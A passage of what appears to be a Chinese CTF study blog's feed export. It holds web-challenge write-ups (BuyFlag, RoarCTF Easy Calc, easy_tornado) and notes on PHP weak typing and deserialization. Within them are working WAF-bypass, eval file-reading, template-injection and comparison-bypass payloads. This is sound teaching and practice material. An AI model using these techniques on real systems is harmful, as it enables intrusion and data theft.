class="hljs-comment">//出题人干扰函数</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//判断filename和content是否存在</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-comment">//如果content长度大于100</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-comment">//写文件到filename</span><br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-comment">//判断响应</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//判断传入参数是否在ascii码表指定范围内，在就返回false</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">//接收str参数，is_valid判断后反序列化</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战2019_BuyFlag</title>
    <link href="/2022/10/23/BuyYourFlag/"/>
    <url>/2022/10/23/BuyYourFlag/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BuyFlag">[极客大挑战 2019]BuyFlag</h2><h2 id="0x00-过程">0x00 过程</h2><p>进到页面发现右上角一个菜单，发现二级页面buyflag，直奔主题。</p><p><img src="/2022/10/23/BuyYourFlag/image-20221023113159979.png" alt></p><p>根据提示发现买flag需要两个条件，一个是用户必须是CUIT，然后密码输对，最后要有足够的钱。这里只需要把cookie里的<code>user=0</code>改成<code>user=1</code>即可绕过用户限制。</p><p>查看源码发现密码提交的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//post money and password</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现用到了<code>is_numeric</code>,这里判断password是否为数字，如果为数字则返回<strong>密码不能是数字</strong>,如果不是数字则会判断是否等于404，相等才会告知密码正确。</p><p>这就出现了矛盾点，首先不能是数字，而且密码还必须是404。不过我们可以通过在参数值前后加非数字值进行绕过，例如<code>is_numeric(404%00)</code>，则会判断为字符串而不是数字。而双等号在php是弱比较，即<code>404abcd==404</code>为真。就可以绕过限制了。</p><p><img src="/2022/10/23/BuyYourFlag/image-20221023114136204.png" alt></p><p>但是我们还需要提交金钱，后面再加一个<code>&amp;money=100000000</code>，发现做了限制：</p><p><img src="/2022/10/23/BuyYourFlag/image-20221023114636432.png" alt></p><p>还能通过常用绕过strcmp方法：money[]=1，这是因为strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，即在面对数组类型时会报错返回0来达到漏洞绕过。</p><p><img src="/2022/10/23/BuyYourFlag/image-20221023114653722.png" alt></p><p>这里也可以使用科学计数法，<code>money=1e16</code>来绕过。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RoarCTF_2019_Easy Calc</title>
    <link href="/2022/10/23/EasyCalc/"/>
    <url>/2022/10/23/EasyCalc/</url>
    
    <content type="html"><![CDATA[<h1>[RoarCTF 2019]Easy Calc</h1><h2 id="0x00-过程">0x00 过程</h2><p>看见一个页面：</p><p><img src="/2022/10/23/EasyCalc/image-20221023104845251.png" alt></p><p>查看源代码，发现计算式会以num参数提交给<code>calc.php</code>，并且设置了waf：</p><p><img src="/2022/10/23/EasyCalc/image-20221023104941008.png" alt></p><p>访问下<code>calc.php</code>，可以看到高亮的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很直接地告诉我们要利用<code>eval</code>函数达成命令执行，但是在之前会有一个黑名单的过滤。也就是说除了设置了waf，程序本身还有一层过滤。如果是waf被触发，会返回403：</p><p><img src="/2022/10/23/EasyCalc/image-20221023105317469.png" alt></p><p>这里可以利用php的一个特性：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">//waf检测到num参数含有字符串，拒绝访问<br>http://node4.buuoj.cn:28058/calc.php?num=abcd<br>//waf检测不到num参数，放行<br>http://node4.buuoj.cn:28058/calc.php?+num=abcd<br></code></pre></td></tr></table></figure><p>虽然我们将num参数前加了一个空格，但是在<strong>php解析过程中，会先把参数里的空格去掉，这样我们提交的参数值仍然可以走程序逻辑，这样就达到了一个绕waf的效果。</strong></p><p>用chr字符拼接发现，system函数无法执行，这里使用<code>var_dump</code>、<code>scandir</code>、<code>file_get_contents</code>来命令执行。</p><p><img src="/2022/10/23/EasyCalc/image-20221023110625849.png" alt></p><p><code>scandir()</code>函数返回指定目录中的文件和目录的数组。其中<code>scandir(/)</code>相当于<code>ls /</code>，<code>var_dump()</code>相当于<code>echo</code>。</p><p><code>var_dump(scandir(chr(47)))</code>扫描根目录发现flag。</p><p><img src="/2022/10/23/EasyCalc/image-20221023110913701.png" alt></p><p>使用<code>file_get_contents()</code>拿到flag：</p><p><img src="/2022/10/23/EasyCalc/image-20221023111132326.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>护网杯_2018_easy_tornado</title>
    <link href="/2022/10/23/EasyTornado/"/>
    <url>/2022/10/23/EasyTornado/</url>
    
    <content type="html"><![CDATA[<h1>[护网杯 2018]easy_tornado</h1><h2 id="0x00-过程">0x00 过程</h2><p>进页面发现三个路径：</p><p><img src="/2022/10/23/EasyTornado/image-20221023130601322.png" alt></p><p>flag路径告诉了真正的flag存在哪个地方。</p><p><img src="/2022/10/23/EasyTornado/image-20221023130818740.png" alt></p><p>点击hints发现提示：</p><p><img src="/2022/10/23/EasyTornado/image-20221023130617339.png" alt></p><p>发现url路径必须有正确的文件参数和哈希才能访问指定文件。而提示这里告诉了filehash的生成方法，但是cookie里翻了以下没有cookie_secret这个东西。</p><p>welcome路径发现提示render。</p><p><img src="/2022/10/23/EasyTornado/image-20221023130843101.png" alt></p><p>根据题目Toranado和render提示可以猜出，大概率是python tornado的模版注入。搜集相关资料发现，tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>题目中的报错页面是根据msg的输入来进行输出的，这里可以进行<code>&#123;&#123;handler.settings&#125;&#125;</code>模版注入：</p><p><img src="/2022/10/23/EasyTornado/image-20221023131315033.png" alt></p><p><img src="/2022/10/23/EasyTornado/image-20221023131421805.png" alt></p><p>有了cookie_secret，接下来就是顺理成章拿flag。这里就不着重叙述了。</p><h2 id="0x01-参考">0x01 参考</h2><p><a href="https://www.glacierluo.com/exercise/ctf/web/buuoj_hu_wang_bei_2018_easy_tornado_1/">easy_tornado 1 | 洛冰河 (glacierluo.com)</a></p><p><a href="https://blog.csdn.net/qq_45951598/article/details/111312370">python SSTI tornado render模板注入_multi4的博客-CSDN博客</a></p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP常见漏洞</title>
    <link href="/2022/10/23/PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/10/23/PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="md5加密漏洞">md5加密漏洞</h2><p>比较哈希字符串的时候，php程序把每一个以“0x”开头的哈希值都解释为科学计数法0的多少次方，恒为0。<br>所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么php将会认为他们相同。<br>另外md5加密是有几率两个字符串不同，但是加密后的值是相同的情况，这种情况称为哈希碰撞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str1</span> = <span class="hljs-string">&#x27;s878926199a&#x27;</span>;<br><span class="hljs-variable">$str2</span> = <span class="hljs-string">&#x27;s214587387a&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;md5_str1&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>),<br>    <span class="hljs-string">&#x27;md5_str2&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>),<br>    <span class="hljs-string">&#x27;bool&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>)<br>]);<br></code></pre></td></tr></table></figure><p>结果如下，两个值加密后竟然相等！<br>缺点你懂的，如果一个网站的某个用户密码加密后刚好是0e开头的，这个时候黑客过来破解，很容易就攻入了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    md5_str1:</span> <span class="hljs-string">&quot;0e545993274517709034328855841020&quot;</span>,<br><span class="hljs-symbol">    md5_str2:</span> <span class="hljs-string">&quot;0e848240448830537924465865611904&quot;</span>,<br><span class="hljs-symbol">    bool:</span> true<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="is-numeric漏洞">is_numeric漏洞</h2><h3 id="非数值-数值">非数值-&gt;数值</h3><p>可以将字符串转化成十六进制的数，该函数进行判断：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gml">echo <span class="hljs-built_in">json_encode</span>([<br>    <span class="hljs-built_in">is_numeric</span>(<span class="hljs-number">233333</span>),<br>    <span class="hljs-built_in">is_numeric</span>(<span class="hljs-string">&#x27;233333&#x27;</span>),<br>    <span class="hljs-built_in">is_numeric</span>(<span class="hljs-number">0x233333</span>),<br>    <span class="hljs-built_in">is_numeric</span>(<span class="hljs-string">&#x27;0x233333&#x27;</span>),<br>    <span class="hljs-built_in">is_numeric</span>(<span class="hljs-string">&#x27;233333abc&#x27;</span>),<br>]);<br><span class="hljs-comment">//结果</span><br>[<br>    <span class="hljs-literal">true</span>,<br>    <span class="hljs-literal">true</span>,<br>    <span class="hljs-literal">true</span>,<br>    <span class="hljs-literal">false</span>,<br>    <span class="hljs-literal">false</span><br>]<br></code></pre></td></tr></table></figure><p><code>16进制数0x61646D696E</code>ASII码对应的值是<code>admin</code>，如果我们执行了后面这条命令的话：<code>SELECT * FROM tp_user where username=0x61646D696E</code>，直接就可以查询admin。同样的<code>1 or 1 -&gt; 0x31206f722031</code>。</p><h3 id="数值-非数值">数值-&gt;非数值</h3><p>原题是[极客大挑战 2019]BuyFlag，判断代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>密码是404，但是不能输入数字，所以要考虑绕过的问题，这里记录解题思路。可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。</p><h2 id="in-array漏洞">in_array漏洞</h2><p>in_array中是先将类型转为整形，再进行判断<br>PHP作为弱类型语言，类型转换的时候，会有很大漏洞<br>转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&quot;2%20and%20%&quot;</span>, [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]));<br></code></pre></td></tr></table></figure><p>结果如下：<code>bool(true)</code></p><h2 id="switch漏洞">switch漏洞</h2><p>switch中是先将类型转为整形，再进行判断<br>PHP作为弱类型语言，类型转换的时候，会有很大漏洞<br>转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$i</span> =<span class="hljs-string">&quot;abc&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$i</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i是比3小的数&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i等于3&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下，i是比3小的数。</p><h2 id="intval强转漏洞">intval强转漏洞</h2><p>PHP作为弱类型语言，类型转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换；如果无法转换，将会返回0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;2&#x27;</span>)); <span class="hljs-comment">//2</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;3abcd&#x27;</span>)); <span class="hljs-comment">//3</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;abcd&#x27;</span>)); <span class="hljs-comment">//0</span><br></code></pre></td></tr></table></figure><p>这个时候 $a 的值有可能是 <code>1002 union</code>…</p><blockquote><p>if(intval(<span class="katex-error" title="ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: …ews where id=&quot;.">a) &gt; 1000) {mysql_query(&quot;select * from news where id=&quot;.</span>a)<br>}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞总结</title>
    <link href="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1>PHP反序列化漏洞总结</h1><h2 id="基础知识">基础知识</h2><h3 id="序列化和反序列化">序列化和反序列化</h3><h4 id="序列化">序列化</h4><p>序列化就是将 对象object、字符串string、数组array、变量转换成具有一定格式的字符串，方便保持稳定的格式在文件中传输，以便还原为原来的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">serialize</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$value</span> ) : <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p><strong>serialize()</strong> 返回字符串，此字符串包含了表示 <code>value</code> 的字节流，可以存储于任何地方。</p><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;John&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">18</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$sex</span> = <span class="hljs-string">&quot;male&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$class_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$class</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$class_ser</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210512174021.png" alt="image-20210512174013942"></p><p>这里面O代表对象；4代表对象名长度；Test是对象名；3是对象里面的成员变量的数量；同时注意到类里面的方法并不会序列化。</p><table><thead><tr><th><strong>类型</strong></th><th><strong>结构</strong></th></tr></thead><tbody><tr><td>String</td><td>s:size:value;</td></tr><tr><td>Integer</td><td>i:value;</td></tr><tr><td>Boolean</td><td>b:value;(保存1或0)</td></tr><tr><td>Null</td><td>N;</td></tr><tr><td>Array</td><td>a:size:{key definition;value definition;(repeated per element)}</td></tr><tr><td>Object</td><td>O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td></tr></tbody></table><blockquote><p>注意：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同，当我们做题的时候需要注意这一点，<code>%00</code> 虽然不会显示，但是提交还是要加上去。</p><p><strong>public</strong> : 被序列化的时候属性名 不会更改</p><p><strong>protected</strong> : 被序列化的时候属性名 会变成 <code>%00*%00属性名</code></p><p><strong>private</strong> : 被序列化的时候属性名 会变成 <code>%00类名%00属性名</code></p></blockquote><h4 id="反序列化">反序列化</h4><p>反序列化就是序列化的逆过程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">unserialize</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span> ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p><strong>unserialize()</strong> 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;John&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span> = <span 